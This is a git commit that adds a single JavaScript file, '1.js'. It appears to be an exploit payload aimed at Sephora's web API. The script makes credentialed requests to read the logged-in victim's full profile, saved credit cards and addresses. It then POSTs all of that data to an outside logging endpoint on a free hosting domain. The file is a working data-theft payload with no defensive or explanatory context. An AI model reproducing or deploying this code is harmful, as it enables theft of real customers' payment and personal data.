7c7132b01825f03d01c4e7639ea9ef708447352b
alone-wolf0-sudo <57352896+alone-wolf0-sudo@users.noreply.github.com>
2022-08-25 16:28:36 +0430

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,31 @@
+xhr=new XMLHttpRequest();
+xhr.withCredentials=true;
+xhr.open("GET","https://www.sephora.com/api/users/profiles/current/full?includeApis=profile");
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){
+var resp=xhr.response;
+var resp=JSON.parse(xhr.response);
+id=resp.profile.profileId;
+
+xhr.open("GET",`https://www.sephora.com/api/users/profiles/${id}/creditCards`);
+xhr.withCredentials=true;
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){
+var resp1=xhr.response;
+xhr.open("GET",`https://www.sephora.com/api/users/profiles/${id}/addresses`);
+xhr.withCredentials=true;
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){
+var resp2=xhr.response;
+xhr.open("POST","https://cs-realme.000webhostapp.com/logger1.php");
+xhr.setRequestHeader("Accept", "*\/*");
+xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){
+
+}}
+xhr.send(`prof=${JSON.stringify(resp)}&address=${resp2}&cc=${resp1}`)
+}}
+xhr.send()
+}}
+xhr.send()
+
+}}
+xhr.send()
